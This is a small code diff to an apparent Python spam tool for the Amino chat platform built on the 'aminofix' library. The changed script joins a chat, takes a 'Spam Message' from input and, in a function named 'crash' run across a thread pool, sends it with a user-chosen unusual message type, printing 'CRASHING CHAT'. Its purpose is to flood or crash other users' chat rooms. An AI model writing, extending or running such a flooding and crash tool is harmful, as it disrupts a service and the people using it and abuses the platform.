@@ -80,11 +80,14 @@ print("\033[1;93mJoining Community")
 subclient=aminofix.SubClient(comId=comid,profile=client.profile)
 subclient.join_chat(chatId=id)
 print("\033[1;32mJoined the Chat")
+
+print(" Message type can be 0 / 50 / 107 / 108 / 109 / 114 etc")
+Message_type=input("Your message type >> ")
 content=input("°•°•°•°• Your Spam Message >> ")
 print()
 def crash(chatroom):
 
-    subclient.send_message(chatId=id,message=content,messageType=109)
+    subclient.send_message(chatId=id,message=content,messageType=Message_type)
     print("CRASHING CHAT•••••", content)
 def thread():
     with concurrent.futures.ThreadPoolExecutor() as executor:
